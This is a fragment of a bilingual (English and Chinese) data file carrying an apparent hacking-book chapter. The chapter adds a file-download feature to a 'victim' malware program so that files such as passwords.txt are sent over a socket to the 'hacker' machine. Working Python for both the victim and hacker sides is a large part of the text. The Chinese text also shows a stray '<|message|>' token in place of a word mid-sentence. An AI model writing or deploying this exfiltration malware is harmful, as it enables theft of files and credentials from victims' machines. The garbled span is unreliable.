    \ = 2048 at the top of the file. After we have read the first chunk, we check\
    \ whether the file has more bytes. If it has, we send them iteratively over the\
    \ network by using the while loop until we read the end of the file. This loop\
    \ will stop when there is no further chunk to read from the file. Once we have\
    \ sent the complete file over the network to the hacker, we need to send the identifier\
    \ marker for the hacker to know that they can stop reading further. To do that,\
    \ we send eof_identifier, which has the following value, eof_identifier = \"<END_OF_FILE_IDENTIFIER>\"\
    . The hacker will use this identifier to know that the incoming data is complete.\n\
    \nNext, we need to receive this data in the hacker program. To do this, go to\
    \ the hacker program and check the value received for the exists variable. If\
    \ the reply from the victim is yes, this means that the file exists on the victim's\
    \ machine and we can start downloading it. Note that we just developed the program\
    \ to send data, and now here we will receive the same data. The received data\
    \ will be in the form of bytes, and we will write these bytes onto our hacker's\
    \ PC to generate the same file as on the victim's PC. Let's take a look at the\
    \ following code:\n\n```\nif exist.decode() == \"yes\":\n    print(\"file exists\"\
    )\n    # receive file here\n    file_name = command.strip(\"download \")\n   \
    \ \n    with open(file_name, \"wb\") as file:\n        print(\"Downloading file\"\
    )\n        while True:\n            chunk = hacker_socket.recv(CHUNK_SIZE)\n \
    \           file.write(chunk)\n            if chunk.endswith(eof_identifier.encode()):\n\
    \                chunk = chunk[:-len(eof_identifier)]\n                file.write(chunk)\n\
    \                break\n    \n    print(\"Successfully downloaded, \", file_name)\n\
    ```\n\nIf the file exists, we create a new file with the same name as file_name.\
    \ Note that we create the file in wb or write binary mode, so that we can download\
    \ any type of file. Once we create a file, we need to write the received file\
    \ content that we receive from the victim. We define the CHUNK_SIZE variable equal\
    \ to the same size as we defined in the victim while sending the data, and then\
    \ we start receiving data continuously and write it to the disk until the end,\
    \ which is identified by the marker. You need to define the exact same eof_identifier\
    \ variable as you defined in the victim, otherwise the program will not work.\
    \ Once we reach the identifier, we remove the identifier, write the remaining\
    \ bytes to the disk, and exit the loop. Finally, we can print the statement indicating\
    \ that we have received all the data. Now that our program is complete, using\
    \ this program, we can download data from the victim to the hacker.\n"
  mdcn: "\n\n## 将受害者文件下载到黑客\n\n在这里，我们将修改我们在 *第 6 章，恶意软件开发* 中开发的程序，在其中我们运行 Windows\
    \ 命令以添加文件传输功能（参见 *创建恶意软件* 部分）。首先，我们将添加下载功能，以将受害者 PC 上的任何文件发送到黑客 PC，并在之后反向发送。要通过网络发送文件，我们需要执行某些步骤。这些步骤如下列出：\n\
    \n- 1. 检查文件是否存在。如果不存在，则抛出错误。\n- 2. 如果文件存在，将文件内容读入你的程序。\n- 3. 读取内容后，在数据末尾添加一个特殊标记以表示文件传输完成。\n\
    - 4. 通过网络发送数据字节。\n- 5. 在接收端，接收字节直到匹配标记。\n- 6. 一旦识别出标记，将标记从接收到的字节中移除。\n- 7. 将剩余的字节写入你的\
    \ PC 的文件系统。\n- 8. 关闭连接。\n\n如果您不立即理解这些步骤，请不要担心。我们将逐一讲解这些步骤。您可以将此功能添加到我们在 *第 6 章，恶意软件开发*\
    \ 中已开发的程序中。为了简化操作，使用我们在 *第 6 章，恶意软件开发* 的 *创建恶意软件* 部分中开发的黑客和受害者程序。在 Kali 和 Windows\
    \ PC 上为黑客和服务器创建一个新项目，这次将其命名为 *advanced_server* 和 *advanced_victim*。将之前章节的代码复制到各自的项目中，以便您拥有可构建的代码库。\n\
    \n让我们首先定义如何将文件从受害者发送到黑客。假设受害者 PC 上存在一个文件，其中存储了受害者的密码。这用作示例。理论上，您可以从受害者 PC 下载您想要的任何文件。\n\
    \n假设文件名是 passwords.txt。让我们以图形形式查看策略，以了解这在实践中如何工作：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_155_0.png)\n\
    \n图 7.1 – 向黑客发送文件\n\n首先，我们需要将受害者的文件名从黑客发送到受害者。我们已经在学习 *第 6 章，恶意软件开发* 中的套接字时了解了如何通过网络发送文本数据，因此此过程相当直接。在黑客程序中，我们将设计以下策略来发送我们需要从受害者下载的文件名。我们的命令将如下所示，`download\
    \ passwords.txt`，如果我们想下载名为 `passwords.txt` 的文件。因此，在黑客程序中，我们将检查黑客命令是否以 download\
    \ 开头以创建此条件的 case。让我们看一下以下代码。在我们检查不同条件的 main loop 中，我们将插入以下检查：\n\n```\nelif command.startswith(\"\
    download\"):\n    hacker_socket.send(command.encode())\n    exist = hacker_socket.recv(1024)\n\
    ```\n\n第一行检查黑客的命令是否是要从受害者下载文件。如果是，我们将命令发送给受害者，受害者将回复文件是否存在。根据回复，可能采取进一步行动。如果文件存在，我们将处理下载文件的\
    \ case，否则我们将安全地退出程序。现在，让我们在黑客程序上暂停一下，转到受害者程序。在受害者端，我们需要添加一个类似的 case 来检查命令是否为 download。如果是，我们将从接收到的消息中检索文件名并检查文件是否存在。转到受害者程序并在\
    \ main loop 中编写以下检查：\n\n```\nelif hacker_command.startswith(\"download\"):\n \
    \   file_to_download = hacker_command.strip(\"download \")\n    if os.path.exists(file_to_download):\n\
    \        exists = \"yes\"\n        victim_socket.send(exists.encode())\n    else:\n\
    \        exists = \"no\"\n        victim_socket.send(exists.encode())\n      \
    \  continue\n```\n\n在这里，我们接收命令并检查命令类型。一旦我们接收到包含 download 字符串的命令，我们就可以从命令中剥离 download\
    \ 部分以检索我们感兴趣的实际文件名。在前一段代码的第三行中，我们检查文件是否存在。如果存在，我们发送回 yes，否则发送回 no。请记住，在黑客程序中，我们正在等待接收此回复到\
    \ exists 变量。请注意，我们尚未发送任何文件数据。我们只是创建外部循环以正确处理数据的发送和接收。文件的读取部分将在前一段代码中的第一个 if 语句中处理。现在我们需要读取文件。\n\
    \n让我们看一下以下代码，该代码从受害者机器读取文件然后将其发送回黑客：\n\n```\nwith open(file_to_download, \"rb\"\
    ) as file:\n    chunk = file.read(CHUNK_SIZE)\n    while len(chunk) > 0:\n   \
    \     victim_socket.send(chunk)\n        chunk = file.read(CHUNK_SIZE)\n     \
    \   # This will run till the end of file.\n\n# once the file is complete, we need\
    \ to send the marker.\nvictim_socket.send(eof_identifier.encode())\nprint(\"File\
    \ sent successfully\")\n```\n\n让我们分解我们刚刚看到的代码。file 行是打开并以二进制格式读取文件的命令。即使它是一个文本文件，如果您想通过网络传输文件，最好以二进制格式读取文件，因为在实际情况下文件类型可能是任何类型。然后我们读取一\
    \ chunk 字节，我们在文件顶部定义 CHUNK_SIZE = 2048。在读取第一个 chunk 后，我们检查文件是否还有更多字节。如果有，我们使用\
    \ while 循环迭代地通过网络发送它们，直到读取文件末尾。此循环将在没有更多 chunk 可从文件中读取时停止。一旦我们通过网络将完整文件发送给黑客，我们需要发送标识符标记以便黑客知道可以停止进一步读取。为此，我们发送\
    \ eof_identifier，其值如下，eof_identifier = \"<END_OF_FILE_IDENTIFIER>\"。黑客将使用此标识符来知道传入数据已完成。\n\
    \n接下来，我们需要在黑客程序中接收此数据。为此，转到黑客程序并检查 exists 变量接收到的值。如果受害者的回复是 yes，这意味着文件存在于受害者机器上，我们可以开始下载它。请注意，我们刚刚开发了发送数据的程序，现在在这里我们将接收相同的数据。接收到的数据将以字节形式存在，我们将把这些字节写入我们的黑客\
    \ PC 以生成与受害者 PC 相同的<|message|>。让我们看一下以下代码：\n\n```\nif exist.decode() == \"yes\"\
    :\n    print(\"file exists\")\n    # receive file here\n    file_name = command.strip(\"\
    download \")\n    \n    with open(file_name, \"wb\") as file:\n        print(\"\
    Downloading file\")\n        while True:\n            chunk = hacker_socket.recv(CHUNK_SIZE)\n\
    \            file.write(chunk)\n            if chunk.endswith(eof_identifier.encode()):\n\
    \                chunk = chunk[:-len(eof_identifier)]\n                file.write(chunk)\n\
    \                break\n    \n    print(\"Successfully downloaded, \", file_name)\n\
    ```\n\n如果文件存在，我们将使用与 file_name 相同的名称创建一个新文件。请注意，我们以 wb 或写二进制模式创建文件，以便我们可以下载任何类型的文件。一旦我们创建文件，我们需要写入从受害者接收到的文件内容。我们将\
    \ CHUNK_SIZE 变量定义为与我们在受害者发送时定义的大小相同，然后我们开始连续接收数据并将其写入磁盘直到结束，该结束由标记标识。您需要在受害者中定义完全相同的\
    \ eof_identifier 变量，否则程序将无法工作。一旦我们到达标识符，我们将移除标识符，将剩余字节写入磁盘，然后退出循环。最后，我们可以打印一条语句，表明我们已接收到所有数据。现在我们的程序已完成，使用此程序，我们可以从受害者下载数据到黑客。\n\
    \n"
